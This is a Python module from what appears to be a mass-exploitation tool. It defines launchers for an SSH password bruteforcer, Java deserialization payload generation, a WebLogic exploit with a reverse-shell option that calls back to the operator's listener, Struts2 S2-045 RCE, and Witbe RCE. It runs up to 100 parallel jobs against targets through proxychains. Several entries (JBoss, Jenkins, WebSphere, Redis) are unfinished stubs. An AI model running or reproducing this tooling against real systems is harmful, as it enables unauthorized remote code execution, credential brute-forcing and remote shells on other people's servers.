#!/usr/bin/python3

'''
add exploits here, call them in mec.py
'''

import os

from lib.cli import colors, console


def ssh_bruteforcer():
    '''
    call single thread ssh_bruteforcer
    '''
    password_list = console.input_check(
        "[*] Password list file to use: ", allow_blank=False)
    if not os.path.isfile(password_list):
        console.print_error("[-] Password list not found")
        return []

    # command to exec
    command = console.input_check("[*] Command to exec: ", allow_blank=False)

    # args list
    exploit = 'ssh_bruteforce.py'
    work_path = '/ssh-bruteforce/'
    exec_path = exploit
    custom_args = str(password_list + ' ' + command).split()
    jobs = 100

    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} {} -t <target ip>'.format(exec_path, ' '.join(custom_args)))
    # start scanner
    scanner_args = console.ScannerArgs(work_path, exec_path, custom_args, jobs)
    return scanner_args


def java_payload(ostype, cmd):
    '''
    generate payload
    '''
    if ostype == 'w':
        os.system(
            "java -jar exploits/exserial/exserial.jar \
            CommandExec Win {} > /tmp/win.bin".format(cmd))
    else:
        os.system(
            "java -jar exploits/exserial/exserial.jar \
            CommandExec Linux {} > /tmp/lin.bin".format(cmd))


def jboss():
    '''
    jboss rce
    '''
    print(colors.BLUE + '\n[*] Welcome to JBoss RCE' + colors.END)

    # port = console.input_check("[?] Port of the target server: ",
    # check_type=int)
    ostype = console.input_check(
        "[?] Windows or Linux? [w/l]", choices=['w', 'l'])
    cmd = console.input_check(
        "[?] Command to execute on the target: ",
        allow_blank=False)

    java_payload(ostype, cmd)
    # TODO not finished


def jenkins():
    '''
    jenkins rce
    '''
    print(colors.BLUE + '\n[*] Welcome to Jenkins RCE' + colors.END)
    # TODO not finished


def websphere():
    '''
    websphere rce
    '''
    print(colors.BLUE + '\n[*] Welcome to Websphere RCE' + colors.END)
    # TODO not finished


def weblogic():
    '''
    with reverse shell
    '''
    print(colors.BLUE +
          '\n[*] Welcome to Weblogic getshell exploit' +
          colors.END)

    server_port = console.input_check(
        "[?] What's the port of Welogic server? ",
        check_type=int)
    os_type = console.input_check(
        '[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
    if console.input_check('[?] Do you need a reverse shell? [y/n] ',
                           choices=['y', 'n']) == 'y':
        shell_server = console.input_check(
            '[?] What\'s the IP of shell receiver? ',
            allow_blank=False, ip_check=True)
        port = console.input_check(
            '[?] What\'s the port of shell receiver? ',
            check_type=int)
        if os_type.lower() == 'w':
            custom_args = '-l {} -p {} -P {} --silent -T '.format(
                shell_server, port, server_port) +\
                'reverse_shell -os win'
            custom_args = custom_args.split()
        elif os_type.lower() == 'l':
            custom_args = '-l {} -p {} -P {} --silent -T '.format(
                shell_server, port, server_port) +\
                'reverse_shell -os linux'
            custom_args = custom_args.split()
        else:
            console.print_error('[-] Invalid input')
            return []
    else:
        cmd = console.input_check(
            '[?] What command do you want to execute on the target? ',
            allow_blank=False).strip()
        if os_type.lower() == 'w':
            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
                server_port, cmd).split()
        elif os_type.lower() == 'l':
            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
                server_port, cmd).split()
        else:
            return []

    # start scanner
    exploit = 'weblogic.py'
    work_path = '/weblogic/'
    exec_path = exploit
    jobs = 100
    # waitTime = 25  # deprecated
    scanner_args = console.ScannerArgs(work_path, exec_path, custom_args, jobs)
    return scanner_args


# currently not available
def redis():
    '''
    planning for removal
    '''
    print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)


def s2_045():
    '''
    struts2 045 rce
    '''
    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
    port = console.input_check(
        '[?] What\'s the port of your target server? ',
        check_type=int)

    # args list
    exploit = 's2_045_cmd.py'
    work_path = '/structs2/'
    exec_path = exploit
    custom_args = str('-p ' + port).split()
    jobs = 100

    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} {} -t <target ip>'.format(exec_path, ' '.join(custom_args)))
    # start scanner
    scanner_args = console.ScannerArgs(work_path, exec_path, custom_args, jobs)
    return scanner_args


def witbe():
    '''
    witbe rce
    '''
    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)

    # shell server config
    rhost = console.input_check('[?] IP of your shell server: ')
    rport = console.input_check('[?] and Port? ', check_type=int)

    # exploit config
    exploit = 'witbe.py'
    work_path = '/witbe/'
    exec_path = exploit
    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
    jobs = 50
    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
          ' '.join(custom_args))
    # start scanner
    scanner_args = console.ScannerArgs(work_path, exec_path, custom_args, jobs)
    return scanner_args
